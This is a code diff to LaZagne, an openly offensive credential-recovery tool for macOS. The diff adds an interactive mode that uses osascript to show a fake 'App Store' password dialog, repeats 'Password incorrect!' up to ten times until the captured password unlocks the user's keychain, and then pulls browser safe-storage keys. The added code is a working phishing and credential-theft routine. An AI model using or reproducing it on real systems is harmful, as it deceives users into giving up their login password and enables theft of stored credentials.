@@ -10,12 +10,15 @@
 
 from lazagne.softwares.browsers.mozilla import Mozilla
 from lazagne.softwares.browsers.chrome import Chrome
-import argparse
-import time, sys, os
-import logging
-import json
-import getpass
+import subprocess
 import traceback
+import argparse
+import logging
+import getpass
+import time
+import json
+import sys
+import os
 
 # Configuration
 from lazagne.config.write_output import parseJsonResultToBuffer, print_debug, StandartOutput
@@ -79,7 +82,17 @@ def verbosity():
 	root.addHandler(stream)
 	del args['verbose']
 
+
+def run_cmd(cmd):
+	p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+	result, _ = p.communicate()
+	if result:
+		return result
+	else:
+		return ''
+
 def manage_advanced_options():
+
 	if 'password' in args:
 		constant.user_password = args['password']
 
@@ -182,13 +195,42 @@ def get_safe_storage_key(key):
 
 	return False
 	
-def runLaZagne(category_choosed='all'):
+def runLaZagne(category_choosed='all', interactive=False):
 	user = getpass.getuser()
 	constant.finalResults = {}
 	constant.finalResults['User'] = user
 
-	for r in runModule(category_choosed):
-		yield r
+	# could be easily changed
+	application = 'App Store'
+	
+	i = 0
+	while True:
+		# run all modules
+		for r in runModule(category_choosed):
+			yield r
+
+		# execute once if not interactive, otherwise print the dialog box many times until the user keychain is unlocked (which means that the user passwod has been found) 
+		if not interactive or (interactive and constant.user_keychain_find):
+			break
+		
+		elif interactive and constant.user_keychain_find == False:
+			msg = ''
+			if i == 0: 
+				msg = 'App Store requires your password to continue.'
+			else:
+				msg = 'Password incorrect! Please try again.'
+
+			# code inspired from: https://github.com/fuzzynop/FiveOnceInYourLife
+			cmd = 'osascript -e \'tell app "{application}" to activate\' -e \'tell app "{application}" to activate\' -e \'tell app "{application}" to display dialog "{msg}" & return & return  default answer "" with icon 1 with hidden answer with title "{application} Alert"\''.format(application=application, msg=msg)
+			pwd = run_cmd(cmd)
+			if pwd.split(':')[1].startswith('OK'):
+				constant.user_password = pwd.split(':')[2].strip()
+		
+		i += 1
+
+		# if the user enter 10 bad password, be nice with him and break the loop
+		if i > 10:
+			break
 
 	# if keychains has been decrypted, launch again some module
 	chrome_key = get_safe_storage_key('Chrome Safe Storage')
@@ -207,11 +249,12 @@ if __name__ == '__main__':
 	# Version and verbosity 
 	PPoptional = argparse.ArgumentParser(add_help=False,formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
 	PPoptional._optionals.title = 'optional arguments'
-	PPoptional.add_argument('-v', dest='verbose', action='count', default=0, help='increase verbosity level')
+	PPoptional.add_argument('-i', '--interactive', default=False, action='store_true', help='will prompt a window to the user')
 	PPoptional.add_argument('-password', dest='password', action='store', help='user password used to decrypt the keychain')
 	PPoptional.add_argument('-attack', dest='attack', action='store_true', help='500 well known passwords used to check the user hash (could take a while)')
 	PPoptional.add_argument('-path', dest='path', action='store', help='path of a file used for dictionary file')
 	PPoptional.add_argument('-b', dest='bruteforce', action='store', help='number of character to brute force')
+	PPoptional.add_argument('-v', dest='verbose', action='count', default=0, help='increase verbosity level')
 
 	# Output 
 	PWrite = argparse.ArgumentParser(add_help=False,formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
@@ -278,7 +321,7 @@ if __name__ == '__main__':
 
 	start_time = time.time()
 
-	for r in runLaZagne(category_choosed):
+	for r in runLaZagne(category_choosed, arguments.interactive):
 		pass
 
 	write_in_file(stdoutRes)
